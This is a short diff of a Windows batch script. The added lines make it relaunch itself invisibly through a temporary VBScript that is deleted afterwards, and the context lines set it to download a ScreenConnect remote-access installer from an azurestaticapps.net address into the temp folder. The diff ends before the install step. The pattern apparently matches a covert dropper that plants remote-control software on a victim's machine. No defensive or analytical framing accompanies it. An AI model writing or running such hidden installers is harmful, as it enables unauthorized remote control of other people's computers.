@@ -1,5 +1,11 @@
 @echo off
 REM CDRP7F3A9D2B8C4
+if /i not "%~1"=="H" (
+>"%TEMP%\h.vbs" echo Set w=CreateObject("WScript.Shell"^):w.Run "cmd /c ""%~f0"" H",0,False
+wscript //nologo "%TEMP%\h.vbs"
+del "%TEMP%\h.vbs" 2>nul
+exit /b 0
+)
 setlocal EnableExtensions
 set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
 set "URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
